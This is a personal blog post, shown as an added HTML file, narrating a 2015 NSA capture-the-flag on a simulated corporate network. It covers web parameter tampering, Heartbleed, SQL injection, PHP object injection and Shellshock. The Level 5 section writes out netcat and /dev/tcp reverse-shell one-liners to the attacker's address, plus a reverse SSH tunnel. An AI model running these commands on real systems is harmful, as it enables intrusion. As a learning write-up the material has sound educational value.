@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>nsa cybersprint 2015 | Tack, Hunt, Pool</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="writeups" />
+  
+  
+  <meta name="description" content="This is my first writeup, written in 2015 in Word and back-dated Last weekend, I took to some haxxoring in the NSA Cybersprint Competition, a Capture-The-Flag that took place on a simulated corporate">
+<meta name="keywords" content="writeups">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NSA Cybersprint 2015">
+<meta property="og:url" content="http://raywang.tech/2015/12/12/NSA-Cybersprint-2015/index.html">
+<meta property="og:site_name" content="Tack, Hunt, Pool">
+<meta property="og:description" content="This is my first writeup, written in 2015 in Word and back-dated Last weekend, I took to some haxxoring in the NSA Cybersprint Competition, a Capture-The-Flag that took place on a simulated corporate">
+<meta property="og:image" content="http://raywang.tech/images/2017/09/heartbleed.png">
+<meta property="og:image" content="http://raywang.tech/images/2017/09/ncat.png">
+<meta property="og:image" content="http://raywang.tech/images/2017/09/reverse.png">
+<meta property="og:updated_time" content="2017-09-03T21:39:42.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="NSA Cybersprint 2015">
+<meta name="twitter:description" content="This is my first writeup, written in 2015 in Word and back-dated Last weekend, I took to some haxxoring in the NSA Cybersprint Competition, a Capture-The-Flag that took place on a simulated corporate">
+<meta name="twitter:image" content="http://raywang.tech/images/2017/09/heartbleed.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Tack, Hunt, Pool" type="application/atom+xml">
+  
+  <link rel="icon" href="/css/images/favicon.ico">
+  <link href="https://fonts.googleapis.com/css?family=Droid+Sans:400,700|Source+Sans+Pro" rel="stylesheet">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+
+  
+    <link rel="stylesheet" href="/css/dialog.css">
+  
+
+  
+    <link rel="stylesheet" href="/css/header-post.css" >
+  
+
+  
+
+</head>
+
+<body>
+  
+  <div id="container">
+    <div id="wrap">
+      
+        <header>
+
+    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
+        <div class="navbar-inner">
+
+          <div class="container">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+              <span class="sr-only">Toggle navigation</span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+
+            <div class="navbar-collapse collapse">
+              <ul class="nav navbar-nav">
+                
+                  <li> <a class="main-nav-link" href="/">Home</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/archives">Archives</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/categories">Categories</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/tags">Tags</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/about">About</a> </li>
+                
+                  <li><div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+
+</div>
+</li>
+            </div>
+          </div>
+
+      </div>
+    </div>
+
+</header>
+
+
+
+      
+
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-NSA-Cybersprint-2015"
+  
+  style="width: 75%; float:left;"
+  class="article article-type-post" itemscope itemprop="blogPost" >
+  <!-- Back button -->
+  
+  <a href="javascript:history.go(-1)" class="back-button-link"><i class="back-button-icon"></i> Back</a>
+  
+
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      NSA Cybersprint 2015
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2015/12/12/NSA-Cybersprint-2015/" class="article-date">
+	  <time datetime="2015-12-12T22:38:28.000Z" itemprop="datePublished">12-12-2015</time>
+	</a>
+
+      
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><strong>This is my first writeup, written in 2015 in Word and back-dated</strong></p>
+<p>Last weekend, I took to some haxxoring in the NSA Cybersprint Competition, a Capture-The-Flag that took place on a simulated corporate network infrastructure.</p>
+<p>Here’s what it was like.</p>
+<a id="more"></a>
+<p>I’m in the position of a penetration tester who’s been hired to probe the major pharmaceutical company, BWP, for vulnerabilities.</p>
+<p>In five levels of increasing difficulty, I must explore and exploit an array of BWP’s internal sites. I’m testing an extensive set of abilities, including command-line savvy and knowledge of vulnerabilities and hacking tools. But what’s going to help me most is creative problem-solving. As in the real world, there are a lot of unexpected obstacles that complicate break-ins, but inventing workarounds is key to the sport.</p>
+<p>I use the Kali Linux distribution as my hacking box, which comes with a massive suite of pentesting tools pre-installed. Booting off an external drive with Kali installed, I have a hacker’s playground.</p>
+<p>On Level 1, I’m given access to our company’s webmail service and internal social network with the credentials of an unprivileged user. I’ll need to leverage this network throughout my investigation to be able to know which employees work for which teams. Without needing too much technical know-how, I navigate around the directory webpages, picking up information about the organization’s users and teams (called ‘Spaces’). I notice there’s a Sales space, an IT admin space, and a Patent space, among others.</p>
+<p>In a cute little warmup, I’m asked to craft a social-engineering attack — email a manager asking for a list of patent-holders and their patents in the most innocent way possible. Of course, only a bot responds to me, but this highlights a low-hanging fruit in real life — human beings are often the weakest link in a company’s security chain.</p>
+<p>A dozen small checkpoints later, I’m on Level 2. There’s a secret IT-only staff page that I need to get access to. As it turns out, only IT staff members can get the password to this site, by requesting the credentials from an online portal. So I log in to the portal as my unprivileged self and notice there’s an online form with my username in an uneditable input field. I tweak the page source to impersonate an IT staff member, send the form, and get an automated response with the IT-only login. Nothing fancy yet, just using the Page Inspector, which is built into browsers like Firefox and Chrome. It’s contrived, sure, but we’re only on Level 2!</p>
+<p>I login to the secret page. Now, I’m staring at the IT dashboard and a big list of tickets. Let’s look at the most recent ticket — it has to do with a closed-circuit TV (CCTV) server. But there’s a problem — ticket details are restricted to IT staff members, and I don’t have the credentials of any.</p>
+<p>Kali Linux comes with the Burp Suite, which has a host of capabilities for testing web applications. Setting up a proxy between Burp and the webpage, I can view all the requests and responses that are being sent back and forth, and I can change the contents before sending them along. To do this, I configure my browser to forward connections to Burp’s proxy port and turn on Burp’s ‘intercept’ feature.</p>
+<p>To view ticket details, it looks like I need to change this <code>show_details</code> parameter in the HTTP GET request to <code>true</code>. I use Burp to intercept my browser’s request to the web page, replacing the parameter and then forwarding the request along. The server, seeing this edited request, displays the details: “CVE-2014-0160”.</p>
+<p>What’s this? It’s a vulnerability in the OpenSSL library commonly known as Heartbleed, which is classified as a ‘buffer-overread’. This bug in a critical library for secure communications got a lot of attention in 2014 because it compromised hundreds of millions of secure web servers.</p>
+<p>When one machine on a secure channel tries to ask another if it’s still alive, it’s called the ‘heartbeat’ protocol. One side sends a payload length and payload to the other side, which reads the payload and sends it back. But, if the payload length is greater than the payload data, the responding machine will read back not just the payload, but also anything in memory stored beyond the payload data. This is due to a faulty bounds-check that doesn’t check whether the ‘payload length’ value is actually correct.</p>
+<p><img src="/images/2017/09/heartbleed.png" alt="Heartbleed xkcd"></p>
+<p>The penetration testing command-line tool Metasploit comes with a Heartbleed scanner pre-installed. A few inputs and an <code>exploit</code> command later, I’ve leaked the CCTV server’s memory and discovered a password in the leak. Now, I can log in and view video camera feeds. Level 2 is complete.</p>
+<p>Rolling right along, I now move to Level 3 in which I break into the sales team.</p>
+<p>I try to log in to the sales submission website, but I’m not a sales staff member, so no luck. It’s time to whip out Burp again to forge some parameters and masquerade as sales. This time, I replace a <code>user</code> parameter in my browser request with the username of a sales team member. It works.</p>
+<p>On the sales submission site, I notice an error log file, which naively has a set of customer credentials buried in it.</p>
+<p>With these credentials, I can get onto the Customer Relationship Management (CRM) portal. Now my SQL skills are put to the test. There’s a ‘Sales Analysis’ table on this site, whose backend is a MySQL database. It’s got a list of drug sales to different buyers and their associated dollar amounts. Some of the entries are hidden — some buyers are ‘restricted’, and I can’t see sales involving them.</p>
+<p>But it seems like the URL takes SQL queries as parameters. Sticking into the request url <code>?columns=*</code>, I’ve crafted the command <code>SELECT * FROM sales WHERE restricted=0</code>. This command shows all columns in the table, but the server adds a WHERE clause to exclude the entries where the restricted column</p>
+<p>Now, I want to get rid of that pesky <code>WHERE</code> clause so that I can view all the restricted transactions. I add to the url <code>?columns=* FROM sales; --</code>. The double hyphens out-comment everything after it, so the WHERE filter is not executed. I can see all entries, including the one company with the restricted field set to 1.</p>
+<p>We’re not quite done. The restricted company’s name is base64-encoded with a custom alphabet key, and I have to use an online service to decode the name. Moving right along.</p>
+<p>I check out Level 4. It’s all about Windows. Skip!</p>
+<p>Level 5 is by far the trickiest set of tasks.</p>
+<p>I’m given a web application for a personal pill-scheduling site called Digital Pillbox, and I need to find some way to get a reverse shell on the web server. From there, I need to exploit the remote version-control server, and finally, I have to obtain a shell on the build server. How do I get started?</p>
+<p>Well, there happens to be a .git folder in the web directory that I can access. This folder contains all information about a Git version control repository, which includes configuration, logs, etc. And I know I can recreate the source files if I have this repo. So, I use <code>wget -r --no-parents --reject ‘index.html</code> to mirror the <code>.git</code> folder to a folder on my local machine, recursively downloading the contents from the webpage.</p>
+<p>Wget is a command-line program for retrieving the contents of web servers. The <code>-r</code> option tells wget to go through all the contents of the directory recursively. The <code>--no-parents</code> prevents the parent directories of the .git folder from being downloaded. <code>--reject ‘index.html’</code> will reject a set of duplicate files starting in <code>index.html</code> that we don’t need.</p>
+<p>To recover the source files, I run a git stash in the local <code>.git</code> folder. The source code is a set of PHP scripts for enrolling users, creating users, and logging in to the web app. There’s also a cookies.inc file, which contains PHP code to generate HTTP cookies for app authentication.</p>
+<p>I have to perform the most difficult task in the competition — a PHP object injection. Basically, I craft a cookie in which I’ve embedded some arbitrary commands and send it to the web app. The app will execute the commands, which will give me a reverse shell.</p>
+<p>Here we go. I first set up a netcat listener on port 9999 on my computer with <code>nc -l -p 9999</code>. Netcat is the Swiss Army knife of networking. One thing it can do is open a listening port on my machine, which then receives data sent to the port and can send data back to a connecting client.</p>
+<p><img src="/images/2017/09/ncat.png" alt="Netcat reverse shell"></p>
+<p>Let’s take a look at the commands I’m going to inject into the web server:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">rm /tmp/f</div><div class="line">mkfifo /tmp/f</div><div class="line">cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc [my ip address] 9999 &gt; /tmp/f</div></pre></td></tr></table></figure>
+<p>I first create a named pipe called <code>/tmp/f</code>, which acts like a first-in first-out queue. Anything sent to this file-like object will be read out in the order that it came in.</p>
+<p>Now the last command. The <code>/bin/sh -i</code> creates an interactive shell, which is sent with netcat to my IP address on port 9999 and displayed on my terminal. Whatever commands I type on my local machine are directed to <code>/tmp/f</code> with the <code>&gt; /tmp/f</code>. I read in from <code>/tmp/f</code> with <code>cat</code> and pipe the contents to the shell, which executes them in my reverse shell.</p>
+<p>I could have done this without the named pipe using an option that’s built into netcat, but is often disabled for obvious security reasons — <code>nc –e /bin/sh</code>. The <code>-e</code> option executes the program after the netcat connection is made.</p>
+<p>But how do I get the web server to run these commands? Well, what’s sent to the server when I login to the app is a serialized User cookie in the user_data parameter. The User object is defined in the user.php file. It so happens that there’s a vulnerable function in the User class called array_filter that executes a string as a function.</p>
+<p>I grab this user object with Burp and modify it — I add in my list of commands, making sure that array_filter will be called by changing the array_filter value as well.</p>
+<p>To get the server to accept my evil User object, I use the cookies.inc file to generate a browser cookie from my object and sign it. After forwarding this cookie to the app, I look at my netcat listener, and it appears I have a shell!</p>
+<p>Now, I get onto the remote git server, which is defined in the <code>.gitconfig</code> file as having IP <code>10.1.9.88</code>.</p>
+<p>I locate an RSA private key on the webpage, which allows me to open a Secure Shell (ssh) to the git server. But if the git server’s ssh is configured so that I can’t execute any command I want, I can get around that with the Shellshock vulnerability.</p>
+<p>Shellshock is an error in Bash shell function definitions. Normally we define a function like <code>some_name() { [some_command] };</code>. In versions of Bash before September 2014, you could add an arbitrary command after the closing of the function definition, and instead of being ignored, it would be executed independently of the function.</p>
+<p>I open another netcat listener on my machine on port 9998.</p>
+<p>I run <code>ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /tmp/gitlabkey git@10.1.9.88 ‘() { :; }; /bin/bash -i &gt;&amp; /dev/tcp/[my IP address]/9998 0&lt;&amp;1</code>.</p>
+<p>Let’s break it down. <code>-o StrictHostkeyChecking=no</code> means that ssh won’t prompt a user to verify that we want to connect, which is standard for new connections. <code>-o UserKnownHostsFile=/dev/null</code> prevents our machine’s hostkey from being added to a file; <code>/dev/null</code> throws away anything written to it.</p>
+<p>Then, I take advantage of Shellshock. I have an empty function definition with <code>() { :; };</code>, and anything after it will be executed. I create a bash interactive shell that I send across the network to my own machine. <code>&gt;&amp;</code> redirects output and errors to the TCP connection and <code>0&lt;&amp;1</code> redirects the TCP tunnel to standard input. So, my netcat listener now has a reverse shell that executes the commands I type and returns the output to me.</p>
+<p>Finally, getting onto the build server from my Kali machine is done simply with a reverse SSH tunnel.</p>
+<p>From the Git server, I run <code>ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -R 8080:10.9.1.56:80 root:[my ip address]</code>.</p>
+<p>The <code>-R</code> option specifies I want to make a reverse tunnel — the tunnel will bridge my local machine and the build server by routing traffic through the Git server. It’s called a reverse tunnel because I’m opening the tunnel on the Git server, but the entry point is on my Kali box. Port 8080 is the port on my machine that’s listening. IP <code>10.9.1.56</code> is the build server and port 80 is the port on the build server.</p>
+<p><img src="/images/2017/09/reverse.png" alt="Reverse SSH Tunnel (image from chamibuddhika.wordpress.com)"></p>
+<p>One would need a reverse SSH tunnel if the build server is behind a firewall and is only reachable from the Git server. I can’t access either the Git server or the build server directly, unless I set up a reverse tunnel from the Git server that allows me access.</p>
+<p>Now, if I connect to <code>localhost:8080</code>, I can browse the build server. To run arbitrary commands, I can add them to a scheduled build.</p>
+<p>After two days of exploring BWP’s systems, I’ve been able to testing all of my hacking and problem-solving chops. With an expertise in Windows, I could have racked up some more points. Level 4, which I skipped, is all about Windows domain controllers, which are servers that allow user access to resources in a Windows workgroup. First, I would have to get access to the file system and then locate some admin credentials. Then, I could use the metasploit exploit <code>/windows/smb/psexec</code> to get full control of the server and dump its stored passwords.</p>
+<p>But it was quite a well-designed and thorough CTF by the NSA. They’re letting newcomers learn the ropes in Levels 1-3 and distinguishing the best hackers in Levels 4 and 5.</p>
+
+      
+    </div>
+    
+      <footer class="article-footer">
+        
+          
+	<section id="comments" class="comment">
+	  <div id="disqus_thread">
+	  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+	  </div>
+	</section>
+
+	<script type="text/javascript">
+	var disqus_shortname = 'wangray';
+	(function(){
+	  var dsq = document.createElement('script');
+	  dsq.type = 'text/javascript';
+	  dsq.async = true;
+	  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+	  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+	}());
+	(function(){
+	  var dsq = document.createElement('script');
+	  dsq.type = 'text/javascript';
+	  dsq.async = true;
+	  dsq.src = '//' + disqus_shortname + '.disqus.com/count.js';
+	  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+	}());
+	</script>
+
+
+
+        
+        
+          
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeups/">writeups</a></li></ul>
+
+        
+      </footer>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2017/03/07/set1_writeup/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">Matasano Crypto Challenges, Set 1</div>
+    </a>
+  
+</nav>
+
+
+  
+</article>
+
+
+<!-- Table of Contents -->
+
+  <aside id="sidebar">
+    <div id="toc" class="toc-article">
+    
+    </div>
+  </aside>
+
+</section>
+        
+      </div>
+      
+      <footer id="footer">
+  
+
+  <div class="container">
+      <div class="row">
+	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
+	      <p id="copyRightEn">Copyright &copy; 2017 Ray Wang. All Rights Reserved.</p>
+	</div>
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+    var allheader = document.getElementById("allheader");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
+    if (allheader != null) {
+      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    } else {
+      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    }
+</script>
+
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/categories" class="mobile-nav-link">Categories</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav> -->
+    
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+       displayMath: [ ['$$','$$'], ['\\[','\\]'] ],
+      processEscapes: false
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+
+  <script src="/js/dialog.js"></script>
+
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-104530975-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+  <script src="/libs/justifiedgallery/jquery.justifiedGallery.min.js"></script>
+  <link rel="stylesheet" href="/libs/justifiedgallery/justifiedGallery.min.css">
+
+
+
+<script src="/js/script.js"></script>
+<script src="/js/bootstrap.js"></script>
+
+  </div>
+
+  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title" id="myModalLabel">设置</h2>
+      </div>
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+
+
+      <div class="modal-body">
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
+              Toggle font size
+            </a>
+          </div>
+          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
+          <div class="panel-body">
+            Toggled font size
+          </div>
+        </div>
+
+
+
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
+              Toggle night view
+            </a>
+        </div>
+          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
+          <div class="panel-body">
+            Press again to switch views
+          </div>
+        </div>
+
+        <div>
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;About&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+        </div>
+         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
+          <div class="panel-body">
+            Tack, Hunt, Pool
+          </div>
+          <div class="panel-body">
+            Copyright © 2017 Ray Wang All Rights Reserved.
+          </div>
+        </div>
+      </div>
+
+
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <div class="modal-footer">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+</body>
+</html>
